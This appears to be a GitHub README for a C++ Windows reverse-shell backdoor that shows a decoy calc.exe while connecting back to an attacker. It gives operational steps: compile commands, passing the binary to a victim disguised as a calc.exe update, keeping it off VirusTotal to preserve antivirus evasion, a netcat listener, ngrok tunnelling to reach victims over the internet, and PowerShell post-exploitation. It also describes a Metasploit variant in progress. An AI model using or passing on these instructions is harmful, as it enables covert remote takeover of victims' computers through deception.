# Reverseshellcpp
A FUD Backdoor Reverse Shell coded in CPP for any Windows distribution, that will fire a decoy app in the foreground while connecting back to the attacker machine as a silent background process.

Change the IP to the attacker machine's IP and the port number to your desired port number and compile using:
i686-w64-mingw32-g++ reverse.cpp -o calc.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

Pass it to the attacker , stating that this is a updated version of calc.exe.
You can scan the application with your AV solutions , if you want , and I am pretty sure thant 98% of the AV solutions will NOT detect it.
It has passed the check of Windows Defender with an updated definition file.

PLEASE DO NOT UPLOAD TO VIRUSTOTAL !!!

Start a netcat listener on port 8080 using nc -lvp 8080

Once the victim executes the app, the decoy process (calc.exe) will fire up in the foregroud on the victim's end , while a reverse shell will fire up in the background, giving you a DOS prompt on the attacker's end (nc listener).

Type in POWERSHELL on the DOS prompt to leverage the post exploitation module.

PS: Even if the victim decides to exit the calc.exe the reverse shell session will be on , as they are running on 2 different processes.

Cheers

#Captain_Nemo

PS: For WAN exploits , fire up ngrok with the following parameters (incase port forwarding is dissalowed by your ISP)
./ngrok tcp 8080

Region                        United States (us)                                                                                        
Web Interface                 http://127.0.0.1:4040                                                                                     
Forwarding                    tcp://0.tcp.ngrok.io:19864 -> localhost:8080                                                              
                                                                                                                                        
Connections                   ttl     opn     rt1     rt5     p50     p90                                                               
                              0       0       0.00    0.00    0.00    0.00   
                              

Ping 0.tcp.ngrok.io atleast 6-7 times to get a stable mirror IP and port.
When u see that the IP and the port numbers are same after 5-6 last pings , use that IP and port in the code.> compile the code > pass it to the victim machine > make sure ngrok is NOT interrupted on the attacker machine as a new ngrok session will grab a new IP and port > start a nc -lvp 8080 on the attacker system. > execute the payload on the victim machine > get session over WAN/Internet on the attacker machine .

https://youtu.be/I-BsI-Yeh4w

A new incorporation and work in progress is the Reverse_msf.cpp module. Post compilation using the standard methods Metasploit DID grant a meterpreter session , yes, but most of the post capture modules are not working , and it seems either I have to incorporate the functions , which will OBVIOUSLY cause AV detection as those are the signature methods/functions that an antivirus looks for , or use a different payload in metasploit to get a RAW shell( this is afterall a netcat RAW shell) and upgrade that TO A METERPRETER SESSION(shell-to-meterpreter) post capture module, or write my own post exploit modules (A HUGE PROCESS).
Thus WORK IN PROGRESS for reverse_msf.cpp.

https://youtu.be/CM0XtXUoXRQ
